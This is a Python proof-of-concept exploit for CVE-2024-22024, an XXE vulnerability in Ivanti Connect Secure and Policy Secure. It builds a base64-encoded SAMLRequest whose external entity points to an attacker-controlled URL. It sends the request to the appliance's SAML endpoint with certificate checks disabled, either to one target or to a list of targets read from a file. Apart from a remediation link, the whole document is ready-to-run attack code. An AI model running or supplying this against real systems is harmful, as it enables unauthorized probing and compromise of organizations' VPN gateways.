import base64
import requests
import argparse
from pathlib import Path
import urllib3
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single InsecureRequestWarning from urllib3
urllib3.disable_warnings(InsecureRequestWarning)

'''
	PoC by Abdulla
	CVE-2024-22024 (XXE) for Ivanti Connect Secure and Ivanti Policy Secure
	Remediation:
	https://forums.ivanti.com/s/article/CVE-2024-22024-XXE-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure?language=en_US
'''

def send_request(target_url, attacker_url, timeout):
    xml_payload_template = """<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "{}"> %xxe;]><r></r>"""
    xml_payload = xml_payload_template.format(attacker_url + "/test")  # Format with the provided external URL
    encoded_payload = base64.b64encode(xml_payload.encode()).decode()  # Encode in base64
    data = {'SAMLRequest': encoded_payload}  # Data for POST request
    
    # Attempt the POST request with the specified timeout
    try:
        response = requests.post(target_url+"/dana-na/auth/saml-sso.cgi", data=data, verify=False, timeout=timeout)
        print(f"Response from {target_url}: {response.status_code}")
    except requests.exceptions.Timeout:
        print(f"Request to {target_url} timed out.")
    except Exception as e:
        print(f"Error sending request to {target_url}.")

def main(target_urls, attacker_url, timeout):
    if Path(target_urls).is_file():  # If target_urls is a file path
        with open(target_urls, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                send_request(url, attacker_url, timeout)
    else:  # Assume target_urls is a single URL
        send_request(target_urls, attacker_url, timeout)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Check for CVE-2024-22024 vulnerability in Ivanti Connect Secure by Abdulla.")
    parser.add_argument("-u", "--target_url", required=True, help="The target URL or file with URLs where the SAML request should be sent")
    parser.add_argument("-c", "--attacker_url", required=True, help="The attacker URL to include in the XXE payload")
    parser.add_argument("-t", "--timeout", type=int, default=3, help="Timeout in seconds for the request (default is 3 seconds)")
    args = parser.parse_args()
    
    main(args.target_url, args.attacker_url, args.timeout)

